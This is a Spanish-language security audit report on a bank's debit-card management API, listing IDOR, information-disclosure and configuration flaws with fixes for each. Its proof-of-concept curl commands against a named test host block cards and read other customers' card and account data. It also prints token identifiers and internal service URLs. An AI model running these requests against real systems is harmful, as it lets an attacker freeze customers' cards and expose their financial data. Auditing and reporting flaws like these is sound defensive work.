# Reporte de Evaluación de Seguridad - API Gestor de Tarjetas Débito JFK

**Cliente:** JFK-corp
**Fecha:** 2026-01-30
**Auditor:** Security Assessment Team
**Clasificación:** CONFIDENCIAL

---

## Resumen Ejecutivo

Se realizó una evaluación de seguridad de la API "Gestor de Tarjetas Débito" del cliente JFK. Se identificaron **múltiples vulnerabilidades críticas** que requieren atención inmediata, incluyendo fallas de control de acceso (IDOR), exposición de información sensible y falta de rate limiting.

### Resumen de Hallazgos por Severidad

| Severidad | Cantidad | Descripción |
|-----------|----------|-------------|
| **CRÍTICA** | 4 | IDOR en cambio de estado, consulta de tarjetas, cuenta asociada, Swagger expuesto |
| **ALTA** | 3 | Information disclosure en health check, endpoint no documentado, falta de rate limiting |
| **MEDIA** | 2 | Exposición de traceId, falta de headers de seguridad |
| **BAJA** | 1 | Verbosidad en mensajes de error |

---

## Información de la API

- **URL Base:** `https://apim-transversal-dev.azure-api.net/gestortarjetas-uat`
- **Autenticación:** OAuth2 Bearer Token (Azure AD)
- **Framework:** .NET 8
- **Arquitectura:** Clean Architecture
- **Versión:** v1.0

---

## Endpoints Evaluados

| # | Método | Endpoint | Descripción |
|---|--------|----------|-------------|
| 1 | GET | `/health` | Health Check del servicio |
| 2 | GET | `/api/Parametros/ObtenerListaPaises` | Catálogo de países ISO |
| 3 | POST | `/api/Tarjetas/Asignar` | Asociar tarjeta a cuenta |
| 4 | GET | `/api/Tarjetas/Asignadas` | Consultar tarjetas de una cuenta |
| 5 | GET | `/api/Tarjetas/ObtenerEstadosConCausales` | Catálogo de estados y causales |
| 6 | GET | `/api/Tarjetas/ObtenerCuentaAhorrosAsociada` | Cuenta asociada a tarjeta |
| 7 | POST | `/api/Tarjetas/CambiarEstado` | Cambiar estado de tarjeta |
| 8 | POST | `/api/Tarjetas/ActualizarEstado` | Actualizar estado (Evertec) |
| 9 | GET | `/api/Tarjetas/ObtenerInfoTarjetaPorTrackingId` | Info detallada de tarjeta |
| 10 | GET | `/api/Tarjetas/ObtenerCvvDinamico` | Generar CVV dinámico |
| 11 | POST | `/api/Tarjetas/ActualizarDatosDelCliente` | Actualizar datos de cliente |
| 12 | POST | `/api/Tarjetas/ExcepcionesDeCompras` | Configurar excepciones |
| 13 | POST | `/api/Tarjetas/ReemplazarTarjetaVirtual` | **NO DOCUMENTADO** |

---

## Vulnerabilidades Identificadas

### CRÍTICA-01: IDOR en Cambio de Estado de Tarjetas

**Severidad:** CRÍTICA (CVSS 9.8)
**OWASP:** A01:2021 - Broken Access Control
**Endpoint:** `POST /api/Tarjetas/CambiarEstado`

**Descripción:**
El endpoint permite cambiar el estado de CUALQUIER tarjeta conociendo únicamente el `TrackingId`. No existe validación de que el usuario autenticado sea el propietario de la tarjeta.

**Prueba de Concepto:**
```bash
curl -X POST "https://apim-transversal-dev.azure-api.net/gestortarjetas-uat/api/Tarjetas/CambiarEstado" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"TrackingId":"276889","NuevoEstado":3,"Causal":4}'
```

**Respuesta:**
```json
{"Result":{"Message":"Cambio de estado de la tarjeta exitoso","TrackingId":"276889"},"Success":true,"Error":""}
```

**Impacto:**
- Un atacante puede **bloquear tarjetas de cualquier cliente**
- Un atacante puede **cancelar tarjetas permanentemente**
- Permite **denegación de servicio financiero** masivo

**Remediación:**
- Implementar validación de ownership del TrackingId contra el usuario autenticado
- Verificar que el appId/oid del token corresponda al titular de la tarjeta

---

### CRÍTICA-02: IDOR en Consulta de Tarjetas Asignadas

**Severidad:** CRÍTICA (CVSS 8.6)
**OWASP:** A01:2021 - Broken Access Control
**Endpoint:** `GET /api/Tarjetas/Asignadas`

**Descripción:**
Permite consultar información de tarjetas de CUALQUIER cuenta con solo conocer los parámetros `codigoSuca`, `producto` y `consecutivo`.

**Prueba de Concepto:**
```bash
curl "https://apim-transversal-dev.azure-api.net/gestortarjetas-uat/api/Tarjetas/Asignadas?codigoSuca=1&producto=4&consecutivo=123456" \
  -H "Authorization: Bearer {TOKEN}"
```

**Respuesta (datos reales obtenidos):**
```json
{
  "Result": [
    {
      "IdTarjetaJFK": 6,
      "TrackingId": "276889",
      "NumTarjeta": "439216******4362",
      "EstadoTd": "Activa",
      "IdEstado": 1,
      "Virtual": true
    },
    {
      "IdTarjetaJFK": 7,
      "TrackingId": "276732",
      "NumTarjeta": "439216******9495",
      "EstadoTd": "Bloqueo Inicial",
      "Virtual": false
    }
  ]
}
```

**Impacto:**
- Exposición de números de tarjeta parciales (BIN visible: 439216)
- Exposición de TrackingIds que habilitan ataques posteriores
- Enumeración de tarjetas por fuerza bruta

**Remediación:**
- Validar ownership de la cuenta contra el usuario autenticado
- Implementar control de acceso basado en roles (RBAC)

---

### CRÍTICA-03: IDOR en Obtener Cuenta Asociada

**Severidad:** CRÍTICA (CVSS 8.6)
**OWASP:** A01:2021 - Broken Access Control
**Endpoint:** `GET /api/Tarjetas/ObtenerCuentaAhorrosAsociada`

**Descripción:**
El endpoint devuelve información de cuenta bancaria con CUALQUIER número de documento. El parámetro `numeroDocumento` NO se valida contra el titular real de la tarjeta.

**Prueba de Concepto:**
```bash
# Usando número de documento FICTICIO "1234567890"
curl "https://apim-transversal-dev.azure-api.net/gestortarjetas-uat/api/Tarjetas/ObtenerCuentaAhorrosAsociada?numeroTarjeta=4362&numeroDocumento=1234567890" \
  -H "Authorization: Bearer {TOKEN}"
```

**Respuesta:**
```json
{
  "Result": {
    "NumeroCuenta": "4000012345678",
    "CodigoSucursal": 1,
    "Producto": 4,
    "Consecutivo": 123456
  }
}
```

**Impacto:**
- **Bypass total de autenticación de titular**
- Exposición de números de cuenta completos
- Permite escalar ataques con información obtenida

**Remediación:**
- VALIDAR que el numeroDocumento corresponda al titular REAL de la tarjeta
- Implementar verificación de ownership cruzada

---

### CRÍTICA-04: Swagger/OpenAPI Expuesto en Producción

**Severidad:** CRÍTICA (CVSS 7.5)
**OWASP:** A05:2021 - Security Misconfiguration
**Endpoint:** `/swagger/v1/swagger.json`

**Descripción:**
El archivo de especificación OpenAPI está expuesto públicamente, revelando toda la estructura de la API incluyendo un **endpoint no documentado**.

**Prueba de Concepto:**
```bash
curl "https://apim-transversal-dev.azure-api.net/gestortarjetas-uat/swagger/v1/swagger.json" \
  -H "Authorization: Bearer {TOKEN}"
```

**Información Expuesta:**
- Todos los endpoints con sus parámetros
- Estructura completa de DTOs
- Validaciones y tipos de datos
- **Endpoint oculto:** `/api/Tarjetas/ReemplazarTarjetaVirtual`

**Remediación:**
- Deshabilitar Swagger en ambientes de producción
- Si es necesario, proteger con autenticación adicional

---

### ALTA-01: Information Disclosure en Health Check

**Severidad:** ALTA (CVSS 6.5)
**OWASP:** A05:2021 - Security Misconfiguration
**Endpoint:** `GET /health`

**Descripción:**
El endpoint health expone URLs internas de microservicios y tiempos de respuesta.

**Información Expuesta:**
```json
{
  "Checks": [
    {
      "Nombre": "TransversalOrquestadorEvtc",
      "Data": {
        "url": "http://jfk-orquestador-evertec-svc:8080/health",
        "responseTimeMs": 49
      }
    },
    {
      "Nombre": "RegistroLogs",
      "Data": {
        "url": "https://app-registrologs-dev.azurewebsites.net/health",
        "responseTimeMs": 402
      }
    }
  ]
}
```

**Impacto:**
- Exposición de arquitectura interna (Kubernetes service names)
- URLs de servicios que podrían ser atacados
- Información útil para reconnaissance

**Remediación:**
- Eliminar URLs y datos técnicos de la respuesta
- Retornar solo estado "Healthy/Unhealthy"

---

### ALTA-02: Endpoint No Documentado Accesible

**Severidad:** ALTA (CVSS 6.5)
**OWASP:** A05:2021 - Security Misconfiguration
**Endpoint:** `POST /api/Tarjetas/ReemplazarTarjetaVirtual`

**Descripción:**
Endpoint no incluido en la documentación oficial pero accesible.

**Prueba de Concepto:**
```bash
curl -X POST "https://apim-transversal-dev.azure-api.net/gestortarjetas-uat/api/Tarjetas/ReemplazarTarjetaVirtual" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"CodigoSuca":1,"Producto":4,"Consecutivo":123456}'
```

**Respuesta:**
```json
{
  "Success": false,
  "Error": "Ocurrió un error al realizar la operación.",
  "TecError": "Error al reemplazar la tarjeta virtual. Detalles: La transacción no puede ser realizada por el estado actual de la tarjeta virtual."
}
```

**Remediación:**
- Documentar o eliminar endpoint
- Aplicar mismos controles de acceso que otros endpoints

---

### ALTA-03: Falta de Rate Limiting

**Severidad:** ALTA (CVSS 6.5)
**OWASP:** A04:2021 - Insecure Design

**Descripción:**
No existe rate limiting en ningún endpoint. Se realizaron 10 requests consecutivos sin restricción.

**Prueba de Concepto:**
```
Request 1: HTTP 200
Request 2: HTTP 200
Request 3: HTTP 200
...
Request 10: HTTP 200
```

**Impacto:**
- Permite ataques de fuerza bruta para enumerar TrackingIds
- Permite DoS a nivel de aplicación
- Facilita explotación de vulnerabilidades IDOR

**Remediación:**
- Implementar rate limiting por IP y por usuario
- Configurar límites en Azure API Management
- Sugerido: 100 requests/minuto por usuario

---

### MEDIA-01: Exposición de TraceId en Errores

**Severidad:** MEDIA (CVSS 4.3)
**OWASP:** A09:2021 - Security Logging and Monitoring Failures

**Descripción:**
Los errores de validación incluyen `traceId` que podría usarse para correlacionar requests.

**Ejemplo:**
```json
{
  "traceId": "|62f8b94e-42d217b636de04c8.62f8b94f_9306e39b_"
}
```

**Remediación:**
- Remover traceId de respuestas a clientes
- Mantener solo en logs internos

---

### MEDIA-02: Headers de Seguridad Faltantes

**Severidad:** MEDIA (CVSS 4.3)
**OWASP:** A05:2021 - Security Misconfiguration

**Headers Presentes:**
- ✅ X-Content-Type-Options: nosniff
- ✅ X-Frame-Options: DENY
- ✅ X-XSS-Protection: 1; mode=block
- ✅ Referrer-Policy: strict-origin-when-cross-origin

**Headers Faltantes:**
- ❌ Content-Security-Policy
- ❌ Strict-Transport-Security (HSTS)
- ❌ Permissions-Policy

**Remediación:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

---

## Controles de Seguridad Positivos

| Control | Estado | Comentario |
|---------|--------|------------|
| Autenticación OAuth2 | ✅ | Tokens Azure AD validados correctamente |
| Validación de JWT | ✅ | Tokens manipulados rechazados con 401 |
| Validación de tipos | ✅ | Parámetros numéricos validados |
| Validación de longitud | ✅ | Límites de caracteres aplicados |
| Protección SQLi básica | ✅ | Inyecciones rechazadas por validación de tipo |
| HTTPS | ✅ | Comunicación cifrada |
| Métodos HTTP restringidos | ✅ | DELETE/PUT/OPTIONS retornan 404 |

---

## Análisis del Token JWT

**Header:**
```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "PcX98GX420T1X6sBDkzhQmqgwMU"
}
```

**Payload:**
```json
{
  "aud": "api://0023fc20-6c71-4ed2-b059-2fb3a605660b",
  "iss": "https://sts.windows.net/641403e9-b8c6-4a52-a098-53d106722dbc/",
  "appid": "2a7b9917-b680-47c4-9a3c-810393d6019c",
  "oid": "bed5c617-5990-4b4f-8b5c-616f399960c5",
  "tid": "641403e9-b8c6-4a52-a098-53d106722dbc"
}
```

**Observaciones:**
- Token válido por 1.08 horas (3900 segundos)
- Algoritmo RS256 (seguro)
- Audiencia específica configurada
- Identificadores de tenant correctos

---

## Recomendaciones Prioritarias

### Inmediato (0-7 días)
1. **Implementar validación de ownership** en todos los endpoints que manejan TrackingId
2. **Corregir IDOR en ObtenerCuentaAhorrosAsociada** validando el titular real
3. **Deshabilitar Swagger** en ambiente UAT/Producción

### Corto Plazo (1-4 semanas)
4. Implementar **rate limiting** (100 req/min por usuario)
5. **Sanitizar respuesta de health check** (remover URLs internas)
6. Agregar **headers de seguridad** faltantes (HSTS, CSP)

### Mediano Plazo (1-3 meses)
7. Implementar **auditoría de acceso** a datos sensibles
8. Implementar **detección de anomalías** en patrones de acceso
9. Revisar y documentar **endpoint ReemplazarTarjetaVirtual**

---

## Anexos

### Datos de Tarjetas Identificados (Ambiente UAT)

| IdTarjetaJFK | TrackingId | NumTarjeta | Estado | Virtual |
|--------------|------------|------------|--------|---------|
| 6 | 276889 | 439216******4362 | Activa | Sí |
| 7 | 276732 | 439216******9495 | Bloqueo Inicial | No |

**Nota:** El BIN 439216 corresponde a tarjetas emitidas, esta información debería estar completamente enmascarada.

### Comandos de Prueba Utilizados

Todos los comandos de prueba están documentados en este reporte para reproducibilidad.

---

**Fin del Reporte**

*Este documento contiene información confidencial y debe ser tratado con las medidas de seguridad apropiadas.*
